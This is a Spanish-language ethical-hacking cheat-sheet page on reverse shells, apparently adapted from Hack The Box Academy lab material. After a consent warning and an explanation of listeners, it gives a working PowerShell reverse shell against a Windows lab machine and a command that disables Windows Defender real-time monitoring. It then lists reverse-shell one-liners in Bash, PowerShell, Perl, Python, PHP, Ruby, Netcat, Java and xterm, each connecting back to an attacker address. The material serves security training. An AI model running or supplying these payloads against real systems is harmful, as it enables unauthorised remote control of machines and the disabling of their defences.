
# Reverse Shells

{% hint style="danger" %}
**Nota:** Este tipo de técnicas son muy invasivas, ya que vamos a ganar acceso a distintos sistemas, por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

***

## <mark style="color:purple;">¿Qué es un Reverse Shell?</mark>

Con un `reverse shell`, el equipo de ataque tendrá un oyente ejecutándose y el objetivo deberá iniciar la conexión.

![imagen](https://academy.hackthebox.com/storage/modules/115/reverseshell.png)

A menudo usamos este tipo de shell cuando nos encontramos con sistemas vulnerables porque es probable que un administrador pase por alto las conexiones salientes, lo que nos brinda más posibilidades de pasar desapercibidos. La última sección analizó cómo los Bind Shells dependen de las conexiones entrantes permitidas a través del firewall en el lado del servidor. Será mucho más difícil lograrlo en un escenario del mundo real.&#x20;

Como se ve en la imagen de arriba, estamos iniciando un detector para un shell inverso en nuestro cuadro de ataque y usando algún método (ejemplo: `Unrestricted File Upload`, `Command Injection,` etc.) para forzar al objetivo a iniciar una conexión con nuestro cuadro de destino, lo que efectivamente significa nuestro ataque. box se convierte en el servidor y el objetivo se convierte en el cliente.

No siempre necesitamos reinventar la rueda cuando se trata de cargas útiles (comandos y código) que pretendemos usar al intentar establecer un caparazón inverso con un objetivo. Existen herramientas útiles que los veteranos de la seguridad de la información han creado para ayudarnos. [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) es un recurso fantástico que contiene una lista de diferentes comandos, códigos e incluso generadores automatizados de shell inverso que podemos usar cuando practicamos o en un entorno real.&#x20;

Debemos tener en cuenta que muchos administradores conocen los repositorios públicos y los recursos de código abierto que suelen utilizar los Pentesters. Pueden hacer referencia a estos repositorios como parte de sus consideraciones principales sobre qué esperar de un ataque y ajustar sus controles de seguridad en consecuencia. En algunos casos, es posible que necesitemos personalizar un poco nuestros ataques.

Trabajemos prácticamente con esto para comprender mejor estos conceptos.

***

## <mark style="color:purple;">Reverse Shell simple en Windows</mark>

Con este tutorial, estableceremos un shell inverso simple usando código de PowerShell en un destino Windows.

Podemos iniciar un oyente de Netcat en nuestro cuadro de ataque a medida que aparece el objetivo.

### **Servidor ( `Atacante`)**

```bash
afsh4ck$ sudo nc -lvnp 443
Listening on 0.0.0.0 443
```

Esta vez con nuestro oyente, lo vincularemos a un [puerto común](https://web.mit.edu/rhel-doc/4/RH-DOCS/rhel-sg-en-4/ch-ports.html) ( `443`), este puerto generalmente es para `HTTPS` conexiones. Es posible que queramos usar puertos comunes como este porque cuando iniciamos la conexión con nuestro oyente, queremos asegurarnos de que no se bloquee al salir a través del firewall del sistema operativo y a nivel de red. Sería raro ver a un equipo de seguridad bloqueando 443 salientes, ya que muchas aplicaciones y organizaciones dependen de HTTPS para acceder a varios sitios web durante la jornada laboral.&#x20;

Dicho esto, un firewall capaz de realizar una inspección profunda de paquetes y visibilidad de Capa 7 puede detectar y detener la salida de un shell inverso en un puerto común porque examina el contenido de los paquetes de red, no solo la dirección IP y el puerto. La evasión detallada del firewall está fuera del alcance de este módulo, por lo que solo abordaremos brevemente las técnicas de detección y evasión a lo largo del módulo, así como en la sección dedicada al final.

Una vez que se haya generado el objetivo de Windows, nos conectaremos usando RDP.

Netcat se puede utilizar para iniciar el Reverse Shell en el lado de Windows, pero debemos tener en cuenta qué aplicaciones ya están presentes en el sistema. Netcat no es nativo de los sistemas Windows, por lo que puede resultar poco confiable contar con su uso como nuestra herramienta en el lado de Windows.&#x20;

Veremos en una sección posterior que para usar Netcat en Windows, debemos transferir un binario de Netcat a un destino, lo que puede ser complicado cuando no tenemos capacidades de carga de archivos desde el principio. Dicho esto, es ideal utilizar cualquier herramienta que sea nativa del objetivo al que intentamos acceder.

### ¿Qué aplicaciones y lenguajes de shell están alojados en el destino?

Esta es una excelente pregunta para hacer cada vez que intentamos establecer un Reverse Shell. Usemos el símbolo del sistema y PowerShell para establecer este Reverse Shell simple.

En el destino de Windows, abra un símbolo del sistema y copie y pegue este comando:

### **Cliente (`Objetivo`)**

```bash
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.20',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Mira de cerca el comando y considera qué debemos cambiar para que nos permita establecer un shell inverso con nuestro equipo de atacante. Efectivamente, `debemos ajustar la IP` para que apunte a la IP de nuestro equipo de atacante. Este código de PowerShell también se puede llamar `shell code` o nuestro `payload`. Entregar este payload al sistema Windows fue bastante sencillo, considerando que tenemos control total del objetivo con fines de demostración. A medida que avance este módulo, notaremos que aumenta la dificultad en cómo entregamos el Payload a los objetivos.

`¿Qué pasó cuando presionamos Enter en el símbolo del sistema?`

### **Cliente (`Objetivo`)**

```cmd-session
At line:1 char:1
+ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

El software `Windows Defender antivirus`( `AV`) detuvo la ejecución del código. Esto funciona exactamente según lo previsto y, desde una perspectiva de `defensa`, es un archivo `win`. Desde un punto de vista ofensivo, existen algunos obstáculos que superar si AV está habilitado en un sistema al que intentamos conectarnos. Para nuestros propósitos, querremos deshabilitar el antivirus a través de `Ajustes de Protección contra Virus y Amanazas` o usando el siguiente comando en una consola administrativa de PowerShell (haga clic derecho, ejecute como administrador):

### <mark style="color:purple;">**Desactivar AV**</mark>

```bash
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```

Una vez que AV esté desactivado, intente ejecutar el código nuevamente.

### **Servidor (`Atacante`)**

```shell-session
afsh4ck@kali$ sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.36.68 49674

PS C:\Users\htb-student> whoami
ws01\htb-student
```

De vuelta en nuestro equipo de atacante deberíamos notar que establecimos con éxito un reverse Shell. Podemos ver esto por el cambio en el mensaje que comienza con `PS` y nuestra capacidad para interactuar con el sistema operativo y el sistema de archivos. Intenta ejecutar algunos comandos estándar de Windows para practicar un poco.

## <mark style="color:purple;">Reverse Shell (One Liner)</mark>

{% hint style="warning" %}
Debemos cambiar la IP `10.0.0.1` a nuestra IP de atacante para que funcionen
{% endhint %}

### **Bash**&#x20;

Algunas versiones de bash pueden enviarte una reverse shell:

```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

### Powershell

{% code overflow="wrap" %}

```ps
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',ATTACKER_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

{% endcode %}

### **PERL**&#x20;

Aquí tienes una versión más corta y sin características adicionales del perl-reverse-shell:

```perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### **Python**&#x20;

Esto fue probado en Linux / Python 2.7:

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### **PHP**&#x20;

Este código asume que la conexión TCP utiliza el descriptor de archivo 3. Funcionó en mi sistema de prueba. Si no funciona, intenta con 4, 5, o 6...

```php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Si deseas un archivo .php para subir a un servidor, consulta la sección de [`PHP Webshell`](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/shells-y-payloads/webshells/php-webshell.md).

### **Ruby**

```ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### **Netcat**&#x20;

Netcat rara vez está presente en sistemas de producción, y aunque esté disponible, hay varias versiones de netcat, algunas de las cuales no soportan la opción `-e`.

```bash
nc -e /bin/sh 10.0.0.1 1234
```

Si tienes la versión incorrecta de netcat, podrías recuperar tu reverse shell de la siguiente manera:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

### **Java**

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### **xterm**&#x20;

Una de las formas más simples de una reverse shell es una sesión xterm. El siguiente comando debe ejecutarse en el servidor. Intentará conectarse de regreso a ti (10.0.0.1) en el puerto TCP 6001.

```bash
xterm -display 10.0.0.1:1
```

Para capturar el xterm entrante, inicia un servidor X (:1, que escucha en el puerto TCP 6001). Una forma de hacerlo es con Xnest (para ejecutarse en tu sistema):

```bash
Xnest :1
```

Necesitarás autorizar al objetivo para que se conecte a ti (comando también ejecutado en tu host):

```bash
xhost +targetip
```
